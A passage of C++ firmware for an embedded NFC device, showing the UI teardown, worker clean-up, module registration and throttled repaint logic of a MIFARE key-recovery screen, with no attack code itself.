        s_progress_bar = nullptr;
        s_counts_label = nullptr;
        s_keys_label = nullptr;
        s_toggle_btn = nullptr;
        s_toggle_label = nullptr;
        if (s_worker_running) {
            Serial.println("quarky-tab5: [mifare-crack] screen closed mid-run -- "
                           "requesting stop");
            s_stop_requested = true;
        }
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}

void start() {
    if (s_lock == nullptr) s_lock = xSemaphoreCreateMutex();
    ScreenStack::push(build_screen());
}

// Main-task completion handling: restore the chip, drop the field, release
// the GPIO53 arbiter.
void reap_worker() {
    s_worker_running = false;
    s_worker_done = false;

    // The donor re-runs PCD_Init() after every attack ([UG-UI]:942/1086/1132)
    // because the raw-frame paths leave MfRxReg and the antenna in whatever
    // state they last set. This project's equivalent is Ws1850sDriver::init()
    // -- see the COMPOSITION note for why PCD_Init() is never called on the
    // MFRC522_I2C instance itself.
    Ws1850sDriver::init();
    Ws1850sDriver::field_off();
    nfc_release_external_i2c();

    if (s_run_failed) {
        set_status(s_fail_reason);
    } else if (s_stop_requested) {
        set_status("Stopped by user");
    }
    Serial.printf("quarky-tab5: [mifare-crack] run finished (%s)\n",
                  s_run_failed ? s_fail_reason
                               : (s_stop_requested ? "stopped" : "completed"));
    update_ui();
    refresh_keys_label();
}

} // namespace

void register_module() {
    g_registry.register_module({"nfc_mifare_crack", "RFID2: MIFARE Keys",
                                Category::NFC, Affinity::TAB5_NATIVE,
                                start, nullptr});
}

void poll() {
    if (s_worker_running && s_worker_done) {
        reap_worker();
        return;
    }
    if (!s_worker_running) return;
    if (s_status_label == nullptr) return; // screen closed; the worker is
                                           // already winding down via
                                           // s_stop_requested

    // Repaint at ~4 Hz rather than every loop() iteration. Two reasons, both
    // real: each repaint takes the progress mutex the worker also needs, and
    // refresh_keys_label() rebuilds a 512-byte string; doing that thousands
    // of times a second would slow the worker (which shares this core -- see
    // the EXECUTION MODEL block) for no visible benefit. Same interval
    // nfc_read.cpp's kScanIntervalMs uses.
    static uint32_t s_last_paint_ms = 0;
    const uint32_t now = millis();
    if (now - s_last_paint_ms < 250) return;
    s_last_paint_ms = now;

    update_ui();
    refresh_keys_label();
}

} // namespace NfcMifareCrack
